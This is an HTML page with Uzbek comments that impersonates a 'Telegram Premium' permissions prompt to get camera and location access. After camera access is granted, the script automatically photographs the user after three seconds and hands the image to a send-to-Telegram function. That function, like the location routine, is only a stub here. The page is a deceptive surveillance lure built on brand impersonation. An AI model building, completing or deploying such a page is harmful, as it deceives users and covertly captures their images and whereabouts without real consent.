<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Ruxsatlari</title>
    <style>
        /* Stil qismi oldingi kabi */
    </style>
</head>
<body>
    <div id="prompt-overlay">
        <div id="prompt-message">
            <h2>Telegram Premium - Ruxsatlar kerak</h2>
            <p>Iltimos, quyidagi ruxsatlarni bering:</p>
            <button onclick="requestLocation()">Joylashuv ruxsati</button>
            <button onclick="requestCamera()">Kamera ruxsati</button>
        </div>
    </div>

    <video id="camera-preview" autoplay playsinline></video>
    <div id="status"></div>

    <script>
        async function requestCamera() {
            try {
                // 1. Kamerani so'rash
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'environment',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                
                // 2. Kamerani ko'rsatish
                const video = document.getElementById('camera-preview');
                video.srcObject = stream;
                video.style.display = 'block';
                
                // 3. 3 soniyadan keyin rasm olish
                setTimeout(() => {
                    takePhoto();
                }, 3000);
                
            } catch (error) {
                alert('Kamera ruxsati berilmadi: ' + error.message);
            }
        }

        function takePhoto() {
            const video = document.getElementById('camera-preview');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Rasmni serverga yuborish
            canvas.toBlob(blob => {
                sendToTelegram(blob);
            }, 'image/jpeg', 0.9);
            
            // Kamerani yopish
            video.srcObject.getTracks().forEach(track => track.stop());
            video.style.display = 'none';
        }

        function sendToTelegram(photoBlob) {
            // Telegramga yuborish logikasi
            console.log('Rasm muvaffaqiyatli olindi!');
            alert('Rasm muvaffaqiyatli yuborildi!');
        }

        async function requestLocation() {
            // Joylashuvni so'rash logikasi
        }
    </script>
</body>
</html>
